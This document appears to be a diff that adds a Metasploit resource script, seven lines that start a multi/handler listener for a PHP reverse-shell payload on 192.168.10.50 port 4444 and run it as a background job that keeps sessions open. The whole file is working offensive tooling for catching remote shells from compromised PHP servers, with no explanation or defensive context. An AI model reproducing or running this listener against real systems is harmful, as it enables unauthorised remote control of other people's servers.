@@ -1,0 +1,7 @@
+
+use exploit/multi/handler
+set payload php/reverse_php
+set LHOST 192.168.10.50
+set LPORT 4444
+set ExitSession false
+exploit -j -z
